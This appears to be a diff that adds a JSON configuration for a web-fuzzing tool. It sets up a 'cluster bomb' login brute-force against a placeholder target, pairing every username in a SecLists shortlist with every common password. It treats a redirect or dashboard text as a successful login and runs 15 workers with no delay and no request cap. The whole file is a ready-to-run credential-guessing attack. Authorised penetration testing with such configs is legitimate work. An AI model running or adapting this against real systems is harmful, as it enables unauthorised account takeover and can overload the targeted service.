@@ -1,0 +1,45 @@
+{
+  "_comment": "Cluster bomb login brute-force — try every user with every password",
+
+  "target":      "https://target.com",
+  "request":     "login_bruteforce.txt",
+  "attack_mode": "cluster_bomb",
+
+  "payloads": {
+    "USER": {
+      "type": "file",
+      "path": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+      "test_value": "admin"
+    },
+    "PASS": {
+      "type": "file",
+      "path": "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt",
+      "test_value": "password"
+    }
+  },
+
+  "match": {
+    "status_codes":          [302],
+    "response_contains":     ["Welcome", "Dashboard", "Logout"],
+    "response_not_contains": [],
+    "length_not_equals":     null
+  },
+
+  "stop": {
+    "on_first_match": true,
+    "max_matches":    0,
+    "max_requests":   0
+  },
+
+  "options": {
+    "workers":               15,
+    "timeout":               10,
+    "delay_ms":              0,
+    "follow_redirects":      false,
+    "verify_ssl":            false,
+    "update_content_length": true,
+    "save_matches_only":     false,
+    "save_response_body":    true,
+    "output":                "login_results.jsonl"
+  }
+}
